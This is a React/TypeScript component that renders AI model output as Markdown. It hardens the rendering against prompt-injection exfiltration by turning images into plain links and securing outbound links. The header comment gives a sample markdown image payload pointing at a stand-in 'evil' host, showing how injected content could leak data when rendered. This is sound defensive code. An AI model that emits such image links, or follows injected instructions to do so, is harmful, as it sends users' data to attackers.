import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";

/**
 * Model output is untrusted (it can echo prompt-injected web pages or PDFs), so:
 * - images are never auto-loaded — `![alt](https://evil/?d=…)` would otherwise
 *   leak data the moment it renders. They become a plain, visible link instead.
 * - links open in a new tab without referrer/opener and are marked nofollow.
 * Raw HTML stays disabled (no rehype-raw) and react-markdown's default
 * `urlTransform` already strips `javascript:` URLs.
 */
const components: Components = {
  a: ({ node: _node, ...props }) => (
    <a {...props} target="_blank" rel="noopener noreferrer nofollow" />
  ),
  img: ({ src, alt }) => {
    const url = typeof src === "string" ? src : "";
    const label = alt?.trim() || "image";
    if (!url) return <span className="text-muted-foreground">[{label}]</span>;
    return (
      <a
        href={url}
        target="_blank"
        rel="noopener noreferrer nofollow"
        className="break-all text-muted-foreground"
        title="Images in answers are not loaded automatically"
      >
        [image: {label}] {url}
      </a>
    );
  },
};

interface Props {
  children: string;
}

export function Markdown({ children }: Props) {
  return (
    <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
      {children}
    </ReactMarkdown>
  );
}
